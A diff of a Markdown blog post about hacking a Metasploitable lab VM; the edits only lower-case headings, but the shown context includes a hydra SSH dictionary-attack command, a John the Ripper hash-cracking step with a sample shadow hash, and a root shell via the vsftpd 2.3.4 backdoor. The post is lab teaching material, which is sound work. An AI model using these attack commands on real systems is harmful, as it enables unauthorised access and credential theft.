@@ -1,5 +1,5 @@
 ---
-title: Learning Linux Hacking with Metasploitable
+title: Learning Linux hacking with Metasploitable
 date: 2020-02-27T00:24:00.000Z
 description: Learning Linux hacking by attacking a Metasploitable virtual environment
 tags: ['Security', 'Linux']
@@ -17,7 +17,7 @@ Please never run these against external systems.
 [Creating a Hacking Lab: Hacker Experience Learning in a Virtual Environment](https://www.shoeisha.co.jp/book/detail/9784798155302)
 Chapter 5: "Hacking Metasploitable"
 
-## Tool List
+## Tool list
 
 * Netcat
   * A CLI tool for sending and receiving data using TCP/UDP connections
@@ -35,7 +35,7 @@ Chapter 5: "Hacking Metasploitable"
   * A packet capture tool
   * Captures packets in a network to analyze what kind of communication is happening and where
 
-## Port Scanning
+## Port scanning
 
 -p-: Target port numbers 1 to 65535
 -sV: Detect the version of services on each port
@@ -54,7 +54,7 @@ PORT      STATE SERVICE     VERSION
 ...
 ```
 
-## Using the vsftpd Backdoor
+## Using the vsftpd backdoor
 
 vsftpd 2.3.4 contains a backdoor that allows remote command execution.
 (It was inserted on 2011/06/30 and fixed on 2011/07/03.)
@@ -85,7 +85,7 @@ whoami # Run a command
 root   # Result is returned
 ```
 
-## Dictionary Attack to Crack SSH Credentials
+## Dictionary attack to crack SSH credentials
 
 ```
 # Create a user dictionary file
@@ -104,7 +104,7 @@ passwd
 $ hydra -L user.lst -P pass.lst -t 4 <IP> ssh
 ```
 
-## Cracking Encrypted Passwords
+## Cracking encrypted passwords
 
 Use John the Ripper to crack passwords.
 Save the passwords you want to crack in a file with the format `username:encrypted_password` and run the command.
@@ -118,7 +118,7 @@ msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
 $ john --incremental passwords
 ```
 
-## Cracking HTTP Authentication
+## Cracking HTTP authentication
 
 Use hydra to run a dictionary attack against an authentication page to find valid ID and password combinations.
 The format for http-form-post is `<auth API path>:<POST parameters>:<string shown in the response on authentication failure>`.
